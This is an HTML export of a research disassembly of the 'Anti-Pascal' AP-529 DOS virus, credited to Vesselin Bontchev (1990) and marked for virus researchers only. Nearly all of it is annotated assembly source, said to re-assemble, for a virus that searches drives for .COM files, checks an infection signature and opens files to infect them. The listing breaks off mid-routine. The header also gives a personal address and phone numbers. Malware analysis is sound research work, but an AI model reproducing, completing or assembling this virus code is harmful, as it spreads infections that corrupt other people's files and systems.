<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">    </span><span class="sc9">page</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">132</span><span class="sc0">
    </span><span class="sc9">name</span><span class="sc0">    </span><span class="sc5">AP529</span><span class="sc0">
    </span><span class="sc9">title</span><span class="sc0">   </span><span class="sc5">AP529</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc12">'Anti-Pascal'</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">version</span><span class="sc0"> </span><span class="sc5">AP</span><span class="sc4">-</span><span class="sc2">529</span><span class="sc0">
    </span><span class="sc9">.radix</span><span class="sc0">  </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc1">; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป</span><span class="sc0">
</span><span class="sc1">; บ  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", et. 5, ap. 51 บ</span><span class="sc0">
</span><span class="sc1">; บ  Telephone: Private: +359-2-586261, Office: +359-2-71401 ext. 255        บ</span><span class="sc0">
</span><span class="sc1">; บ                                      บ</span><span class="sc0">
</span><span class="sc1">; บ           The 'Anti-Pascal' Virus, version AP-529                บ</span><span class="sc0">
</span><span class="sc1">; บ        Disassembled by Vesselin Bontchev, June 1990          บ</span><span class="sc0">
</span><span class="sc1">; บ                                      บ</span><span class="sc0">
</span><span class="sc1">; บ         Copyright (c) Vesselin Bontchev 1989, 1990           บ</span><span class="sc0">
</span><span class="sc1">; บ                                      บ</span><span class="sc0">
</span><span class="sc1">; บ  This listing is only to be made available to virus researchers      บ</span><span class="sc0">
</span><span class="sc1">; บ        or software writers on a need-to-know basis.          บ</span><span class="sc0">
</span><span class="sc1">; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ</span><span class="sc0">

</span><span class="sc1">; The disassembly has been tested by re-assembly using MASM 5.0.</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">    </span><span class="sc9">segment</span><span class="sc0">
    </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">

    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">

</span><span class="sc5">vlen</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">v_end</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">crit</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">      </span><span class="sc1">; Address of the original INT 24h handler</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Save registers used</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">flen</span><span class="sc0">        </span><span class="sc1">; Save current file length</span><span class="sc0">

</span><span class="sc1">; The operand of the instruction above is used as a signature by the virus</span><span class="sc0">

</span><span class="sc5">sign</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">v_start</span><span class="sc0">   </span><span class="sc1">; Go to virus start</span><span class="sc0">

</span><span class="sc5">flen</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">vlen</span><span class="sc0">        </span><span class="sc1">; File length before infection</span><span class="sc0">
</span><span class="sc5">f_name</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">13d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; File name buffer for the rename function call</span><span class="sc0">
</span><span class="sc5">fmask</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.'</span><span class="sc0">            </span><span class="sc1">; Mask for FindFirst/FindNext</span><span class="sc0">
</span><span class="sc5">fext</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'com'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; The extension part of the file mask</span><span class="sc0">
</span><span class="sc5">parent</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; Path for changing to the parent dir</span><span class="sc0">

</span><span class="sc5">com</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'com'</span><span class="sc0">           </span><span class="sc1">; File extensions used</span><span class="sc0">
</span><span class="sc5">bak</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'bak'</span><span class="sc0">
</span><span class="sc5">pas</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'pas'</span><span class="sc0">
</span><span class="sc5">wild</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'???'</span><span class="sc0">
</span><span class="sc5">exe</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'exe'</span><span class="sc0">

</span><span class="sc5">dta</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">       </span><span class="sc1">; Disk Transfer Address area</span><span class="sc0">
</span><span class="sc5">drive</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;Drive to search for</span><span class="sc0">
</span><span class="sc5">pattern</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;Search pattern</span><span class="sc0">
</span><span class="sc5">reserve</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">9</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;Not used</span><span class="sc0">
</span><span class="sc5">attrib</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;File attribute</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;File time</span><span class="sc0">
</span><span class="sc5">date</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;File date</span><span class="sc0">
</span><span class="sc5">fsize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;File size</span><span class="sc0">
</span><span class="sc5">namez</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;File name found</span><span class="sc0">

</span><span class="sc5">mem_seg</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; Segment of the allocated I/O buffer</span><span class="sc0">
</span><span class="sc5">sizehld</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; Size holder</span><span class="sc0">

</span><span class="sc5">v_start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1000</span><span class="sc0">     </span><span class="sc1">; Shrink program memory size to 64 K</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4A</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48</span><span class="sc0">       </span><span class="sc1">; Allocate I/O buffer in memory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">vlen</span><span class="sc4">/</span><span class="sc2">16d</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">;  (at least vlen long)</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">cleanup</span><span class="sc0">     </span><span class="sc1">; Exit on error</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">mem_seg</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; Save the segment of the allocated memory</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524</span><span class="sc0">     </span><span class="sc1">; Set critical error handler</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_24</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1A</span><span class="sc0">       </span><span class="sc1">; Set new DTA area</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">19</span><span class="sc0">       </span><span class="sc1">; Get default drive</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Save it on stack</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect</span><span class="sc0">      </span><span class="sc1">; Proceed with infection</span><span class="sc0">

    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">      </span><span class="sc1">; Put equipment bits in ax</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Diskette drives present?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">cleanup</span><span class="sc0">     </span><span class="sc1">; Exit if not (?!)</span><span class="sc0">

    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Get number of floppy disk drives</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;  in AH (0-3 means 1-4 drives)</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; Convert the number of drives to</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">       </span><span class="sc1">;  the range 2-5 and put it into BL</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">        </span><span class="sc1">; More than 2 floppy drives?</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">many</span><span class="sc0">        </span><span class="sc1">; Check if the highest one is removable if so</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">        </span><span class="sc1">; Otherwise check disk C:</span><span class="sc0">
</span><span class="sc5">many</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4408</span><span class="sc0">     </span><span class="sc1">; Check whether device is removable</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">cleanup</span><span class="sc0">     </span><span class="sc1">; Exit on error (network)</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Is device removable?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">cleanup</span><span class="sc0">     </span><span class="sc1">; Exit if so</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">       </span><span class="sc1">; Otherwise select it as default</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0E</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect</span><span class="sc0">      </span><span class="sc1">; Proceed with this drive also</span><span class="sc0">

</span><span class="sc5">cleanup</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; Restore saved default disk from stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0E</span><span class="sc0">       </span><span class="sc1">; Set default drive</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">flen</span><span class="sc0">        </span><span class="sc1">; Restore flen</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc5">mem_seg</span><span class="sc0">  </span><span class="sc1">; Free allocated memory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4A</span><span class="sc0">       </span><span class="sc1">; Get all the available memory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">      </span><span class="sc1">; ES := DS</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4A</span><span class="sc0">       </span><span class="sc1">; Assign it to the program (the initial state)</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">       </span><span class="sc1">; Restore old DTA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1A</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524</span><span class="sc0">     </span><span class="sc1">; Restore old critical error handler</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">      </span><span class="sc1">; Save DS</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">crit</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">      </span><span class="sc1">; Restore DS</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; Restore BX</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4F</span><span class="sc0">       </span><span class="sc1">; Copy the program at exit_pgm into</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">;  the Intra-Aplication Communication</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">;  Area (0000:04F0h)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_pgm</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">pgm_end</span><span class="sc4">-</span><span class="sc5">exit_pgm</span><span class="sc0"> </span><span class="sc1">; exit_pgm length</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; Do it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Correct the Far JMP instruction with</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">;  the current DS value</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc1">; Prepare for moving vlen bytes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">flen</span><span class="sc0">     </span><span class="sc1">;  from file end to start</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vlen</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">      </span><span class="sc1">; ES := DS</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc1">;   jmp far ptr 004F:0000   ; Go to exit_pgm</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">exit_pgm</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; Restore the original bytes of the file</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">      </span><span class="sc1">; Restore registers used</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; JMP Far at XXXX:0100</span><span class="sc0">
</span><span class="sc5">pgm_end</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">lseek</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Offset := 0</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">         </span><span class="sc1">; And exit</span><span class="sc0">

</span><span class="sc5">f_first</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; Find first file with extension pointed by SI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fext</span><span class="sc0">  </span><span class="sc1">; Point DI at extension part of fmask</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">         </span><span class="sc1">; Clear direction flag</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">; Copy the extension pointed by SI</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">;  to file mask for FindFirst/FindNext</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4E</span><span class="sc0">       </span><span class="sc1">; Find first file matching fmask</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">       </span><span class="sc1">; Normal files only</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fmask</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">         </span><span class="sc1">; Exit</span><span class="sc0">

</span><span class="sc5">wr_body</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02</span><span class="sc0">     </span><span class="sc1">; Open file for reading and writing</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">namez</span><span class="sc0"> </span><span class="sc1">; FIle name is in namez</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Save handle in BX</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3F</span><span class="sc0">       </span><span class="sc1">; Read the first vlen bytes of the file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vlen</span><span class="sc0">     </span><span class="sc1">;  in the allocated memory buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">      </span><span class="sc1">; Save DS</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">mem_seg</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do it</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">sign</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get virus signature</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">      </span><span class="sc1">; Restore DS</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sign</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; File already infected?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">is_inf</span><span class="sc0">      </span><span class="sc1">; Exit if so</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Save AX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Lseek to the file beginning</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek</span><span class="sc0">       </span><span class="sc1">; Do it</span><span class="sc0">
